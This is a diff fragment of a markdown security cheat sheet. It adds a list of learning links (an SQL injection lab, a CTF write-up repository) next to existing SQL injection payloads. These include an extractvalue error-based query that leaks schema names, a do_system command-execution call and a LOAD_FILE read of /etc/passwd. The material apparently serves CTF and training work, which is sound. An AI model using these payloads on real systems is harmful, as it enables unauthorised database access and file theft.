@@ -2,6 +2,12 @@
 - `select id from demo where name='test' and extractvalue(1, concat(0x7c, (select schema_name from information_Schema.schemata limit 1,1) ) )-- -'`  : only mysql/mariadb
 - `do_system('whoami')` : Run a system command
 - `LOAD_FILE('/etc/passwd')` : Read a file
+- Learning:
+-    -  https://www.php.net/manual/en/class.recursivedirectoryiterator.php
+     -  https://www.programiz.com/php/online-compiler/
+     -  https://notsosecure.com/sql-injection-lab
+     -  https://sqliteonline.com/
+     -  https://github.com/thorleifjacobsen/ctf/tree/master/1753ctf-2024/web-flag-vault
 
 
 ## Common tools¶
